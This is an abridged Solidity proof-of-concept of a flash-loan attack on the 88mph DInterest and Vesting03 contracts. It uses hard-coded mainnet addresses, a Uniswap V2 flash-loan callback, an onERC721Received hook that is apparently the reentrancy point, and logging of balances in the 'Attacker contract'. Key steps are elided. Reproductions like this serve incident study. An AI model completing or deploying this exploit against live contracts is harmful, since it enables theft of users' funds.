...
interface IVesting03 {
    ...
    function rewardPerToken(address DInterestPool)
        external
        view
        returns (uint256);
}
...
contract WithFlashloan is Ownable {
    ...
    IDInterest public DInterest =
        IDInterest(0xaE5ddE7EA5c44b38c0bCcfb985c40006ED744EA6);
    IVesting03 public Vesting03 =
        IVesting03(0xA907C7c3D13248F08A3fb52BeB6D1C079507Eb4B);

    IBalancer public Balancer =
        IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniswapV2 public UniswapV2_USDC =
        IUniswapV2(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

    function run() external {
        UniswapV2_USDC.swap(0, depositAmount, address(this), " ");
        // UniswapV2_USDC swap function callsback uniswapV2Call
    }
    ...
    function _deposit() internal {
        ...
        (depositID, interestAmount) = DInterest.deposit(
            depositAmount,
            maturationTimestamp
        );
    }
    ...
    function uniswapV2Call(
        ...
        WETH.transfer(
            address(UniswapV2_USDC),
            depositAmount + calcFlashloanFee(depositAmount)
        ); // Return the flash loan + pay fee
        _log();
    }
    ...
    function _log() internal {
        ...
        console.log(
            "88MPH Balance in Vesting contract = ",
            _88MPH.balanceOf(address(Vesting03))
        );
        console.log(
            "88MPH Balance in Attacker contract = ",
            _88MPH.balanceOf(address(this))
        );
        console.log(
            "WETH Balance in Attacker contract = ",
    ...
    function onERC721Received(
        ...
        if (msg.sender == address(Vesting03)) {
            ...
            console.log("Vesting03 onERC721Received", vestingTokenID);
        } else {
            DInterestTokenID = uint64(tokenId);
            console.log("DInterestToken onERC721Received", vestingTokenID);
        }
